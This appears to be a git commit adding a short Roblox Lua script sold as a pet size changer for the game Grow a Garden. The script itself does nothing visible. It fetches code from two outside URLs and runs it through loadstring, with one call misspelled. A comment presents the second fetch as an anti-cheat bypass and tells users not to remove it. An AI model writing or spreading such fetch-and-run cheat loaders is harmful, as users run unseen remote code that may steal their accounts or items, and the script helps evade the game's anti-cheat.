7676e3e3bbb276c665a0f765df8509c6fdc94a20
Roblox Scripts <gregyheport@gmail.com>
2025-08-09 14:05:38 +0800

    Create pet-tool-size-changer-growagarden-working.lua

---
+++ pet-tool-size-changer-growagarden-working.lua
@@ -0,0 +1,4 @@
+loadatring(game:HttpGet("https://raw.githubusercontent.com/Rawbr10/loader/refs/heads/main/pet.lua"))()
+task.wait(1)
+loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/WAxJ8MoGbKixWsnR/raw", true))()
+-- Dont Remove the second script it bypass the anti cheat if you remove it theres a chance you will get banned
